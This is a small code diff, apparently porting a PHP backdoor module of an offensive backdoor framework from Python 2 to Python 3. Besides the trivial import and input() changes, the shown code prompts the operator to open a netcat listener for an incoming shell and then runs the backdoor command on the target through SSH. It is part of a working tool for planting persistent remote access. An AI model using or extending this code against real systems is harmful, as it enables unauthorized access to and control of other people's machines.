@@ -1,4 +1,4 @@
-from backdoor import *
+from backdoors.backdoor import *
 
 class Php(Backdoor):
     prompt = Fore.RED + "(php) " + Fore.BLUE + ">> " + Fore.RESET
@@ -20,7 +20,7 @@ class Php(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
         target = self.core.curtarget
-        raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
+        input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
         print(GOOD + "Initializing backdoor...")
         target.ssh.exec_command(self.get_command())
         for mod in self.modules.keys():
